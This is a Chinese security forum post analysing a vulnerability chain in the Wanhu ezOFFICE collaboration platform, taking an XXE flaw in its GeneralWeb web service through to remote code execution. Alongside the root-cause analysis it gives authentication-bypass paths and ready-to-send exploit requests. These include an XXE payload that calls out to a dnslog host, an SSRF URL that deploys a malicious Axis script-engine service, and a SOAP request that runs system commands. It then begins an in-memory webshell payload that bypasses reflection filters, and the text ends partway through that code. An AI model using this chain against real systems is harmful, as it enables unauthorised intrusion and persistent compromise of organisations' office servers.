---
title: 万户ezOFFICE协同管理平台 GeneralWeb XXE to RCE
url: https://forum.butian.net/share/3784
source: 奇安信攻防社区
date: 2024-09-30
fetch_date: 2025-10-06T18:20:08.325521
---

# 万户ezOFFICE协同管理平台 GeneralWeb XXE to RCE

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 万户ezOFFICE协同管理平台 GeneralWeb XXE to RCE

* [漏洞分析](https://forum.butian.net/topic/48)
* [渗透测试](https://forum.butian.net/topic/47)

之前实战遇到了，但是网上的poc懂得都懂，索性就专门研究一下漏洞成因，利用以及内存马方面

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-679b14fb254b2fb83cbe48b2e963318e78236e95.png)
之前实战遇到了，但是网上的poc懂得都懂，索性就专门研究一下
JDK版本：1.6.0
操作系统：Windows Server 2012
漏洞分析
----
从web.xml看起
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-4bbb04580b8ae906e93dab8eefa4cc44dd21a238.png)
使用了 XFire 与 Axis 两种 WebService 框架
看到 XFire 配置文件`D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/WEB-INF/classes/META-INF/xfire/services.xml`
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-d33e85de27468a143fce1fdf4de45d91fb21d709.png)
配置了一个GeneralWeb的服务，找到该类`com.whir.service.webservice.GeneralWeb`
```java
package com.whir.service.webservice;
import com.whir.service.common.CallApi;
public class GeneralWeb {
public String OAManager(String input) throws Exception {
CallApi callapi = new CallApi();
return callapi.getResult(input);
}
}
```
`com.whir.service.common.CallApi#getResult`
```java
public String getResult(String input) throws Exception {
if (serviceMap == null) {
throw new Exception("Error: serviceMap can not is null");
}
SAXBuilder builder = new SAXBuilder();
byte[] b = input.getBytes("utf-8");
InputStream is = new ByteArrayInputStream(b);
Document doc = builder.build(is);
Element root = doc.getRootElement();
```
使用SAXBuilder进行解析并且未进行过滤，产生XXE漏洞
鉴权方面代码在`com.whir.common.util.SetCharacterEncodingFilter`
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-889c69a7c94a8f970c2f358344bf3ac33530d91d.png)
使用的是 getRequestURI，那么就有很多绕过方法了，简单列举几个
```php
/iWebOfficeSign/OfficeServer.jsp/../../
/xfservices/./GeneralWeb
.jsp;.js
```
漏洞利用
----
触发dnslog：
```php
POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
Host:
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 457
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
<soapenv:Body>
<gen:OAManager>
<gen:input>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY x SYSTEM "http://123.6x9ryk.dnslog.cn"&gt;]&gt;
&lt;root&gt;&amp;x;&lt;/root&gt;
</gen:input>
</gen:OAManager>
</soapenv:Body>
</soapenv:Envelope>
```
因为使用了Axis，我们可以通过AdminServlet创建任意服务，看到server-config.wsdd
```xml
<service name="AdminService" provider="java:MSG">
<parameter name="allowedMethods" value="AdminService"/>
<parameter name="enableRemoteAdmin" value="false"/>
<parameter name="className" value="org.apache.axis.utils.Admin"/>
<namespace>http://xml.apache.org/axis/wsdd/</namespace>
</service>
```
那么思路就很清晰了，通过xxe的get请求部署恶意服务，由于JDK是低版本，那么可以部署RhinoScriptEngineService
```xml
http://127.0.0.1:{{Port}}/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment
```
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-933bab13bb758e5a40d3c7a1bdcffcb882bba84b.png)
部署成功
```php
POST /defaultroot/services/./RhinoScriptEngineService HTTP/1.1
Host:
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 973
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
<soapenv:Body>
<eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
<arg0 xmlns="">
<![CDATA[
try {
load("nashorn:Moziilla\_compat.js");
} catch (e) {
}
importPackage(Packages.java.io);
importPackage(Packages.java.lang);
importPackage(Packages.java.util);
var command = "cmd /c whoami";
var pb = new java.lang.ProcessBuilder(Arrays.asList(command.split(" ")));
var process = pb.start();
var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next();
ret;
]]>
</arg0>
<arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
</arg1>
</eval>
</soapenv:Body>
</soapenv:Envelope>
```
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-30d99a7f51736e83f9db2a190628914f5a45c840.png)
成功执行命令
### 内存马
Java-Js-Engine-Payloads：<https://github.com/yzddmr6/Java-Js-Engine-Payloads>
适配了JDK6-14的内存马
```java
try {
load("nashorn:mozilla\_compat.js");
} catch (e) {
}
function getUnsafe() {
var theUnsafeMethod =
java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafeMethod.setAccessible(true);
return theUnsafeMethod.get(null);
}
function removeClassCache(clazz) {
var unsafe = getUnsafe();
var clazzAnonymousClass = unsafe.defineAnonymousClass(
clazz,
java.lang.Class.forName("java.lang.Class")
.getResourceAsStream("Class.class")
.readAllBytes(),
null
);
var reflectionDataField =
clazzAnonymousClass.getDeclaredField("reflectionData");
unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);
}
function bypassReflectionFilter() {
var reflectionClass;
try {
reflectionClass = java.lang.Class.forName(
"jdk.internal.reflect.Reflection"
);
} catch (error) {
reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
}
var unsafe = getUnsafe();
var classBuffer = reflectionClass
.getResourceAsStream("Reflection.class")
.readAllBytes();
var reflectionAnonymousClass = unsafe.defineAnonymousClass(
reflectionClass,
classBuffer,
null
);
var fieldFilterMapField =
reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
var methodFilterMapField =
reflectionAnonymousClass.getDeclaredField("methodFilterMap");
if (
fieldFilterMapField
.getType()
.isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
) {
unsafe.putObject(
reflectionClass,
unsafe.staticFieldOffset(fieldFilterMapField),
java.lang.Class.forName("java.util.HashMap")
.getConstructor()
.newInstance()
);
}
if (
methodFilterMapField
.getType()
.isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
) {
unsafe.putObject(
reflectionClass,
unsafe.staticFieldOffset(methodFilterMapField),
java.lang.Class.forName("java.util.HashMap")
.getConstructor()
.newInstance()
);
}
removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject) {
var unsafe = getUnsafe();
var overrideField = java.lang.Class.for...